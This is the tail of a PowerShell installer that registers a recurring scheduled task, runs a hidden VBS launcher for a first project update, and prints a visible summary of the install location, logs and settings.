        Write-OK ("Task registered (legacy XML) : " + $TASK_NAME)
    } else {
        Write-Fail ("schtasks exit code " + $LASTEXITCODE + " : " + ($result -join " "))
        Write-Info "Task registration failed. The updater script is still generated."
        Write-Info "You can register the task manually via Task Scheduler."
    }
}

# ----------------------------------------------------------------
#  STEP 5 — First update via VBS launcher (zero flash, truly hidden)
# ----------------------------------------------------------------
Write-Step "5/5" "Running first update now (zero flash) ..."
Write-Info "Please wait - this may take 1-2 minutes ..."
Write-Host ""

# Force fresh install by deleting local version stamp
if (Test-Path $LocalVerFile) { Remove-Item $LocalVerFile -Force }

$wsh      = New-Object -ComObject WScript.Shell
$exitCode = $wsh.Run(
    ('wscript.exe "' + $LauncherVBS + '"'),
    0,
    $true
)

if ($exitCode -eq 0) {
    Write-OK "First update succeeded!"
    Write-Info ("Project installed in : " + $RootDir)
} else {
    Write-Fail ("First update failed (exit code " + $exitCode + ")")
    Write-Info ("Check logs at : " + $LogDir)
    Write-Info "The scheduled task is still registered and will retry at the next cycle."
}

# ----------------------------------------------------------------
#  SUMMARY
# ----------------------------------------------------------------
Write-Host ""
Write-Host "  ================================================" -ForegroundColor Cyan
Write-Host "   Installation complete!" -ForegroundColor Green
Write-Host "  ================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host ("  Location  : " + $RootDir) -ForegroundColor White
Write-Host "    +-- project\     -> extracted Python files" -ForegroundColor Gray
Write-Host "    +-- _scripts\    -> Updater.ps1 + Launcher.vbs" -ForegroundColor Gray
Write-Host "    +-- logs\        -> one log file per week" -ForegroundColor Gray
Write-Host "    +-- version.txt  -> current installed version token" -ForegroundColor Gray
Write-Host ""
Write-Host ("  Task      : " + $TASK_NAME) -ForegroundColor White
Write-Host ("  Interval  : every " + $TASK_INTERVAL + " minutes") -ForegroundColor White
Write-Host ("  Task API  : " + $(if ($useModernTaskCmdlet) { "Modern cmdlets (Win8+)" } else { "schtasks.exe XML (Win7)" })) -ForegroundColor White
Write-Host ("  ZIP mode  : " + $(if ($hasNet45) { ".NET ZipFile (fast)" } else { "Shell.Application (fallback)" })) -ForegroundColor White
Write-Host ("  TLS       : forced to 1.2 at runtime") -ForegroundColor White
Write-Host ("  Logs      : " + $LogDir) -ForegroundColor White
Write-Host ""
Write-Host "  Press Enter to close."
Read-Host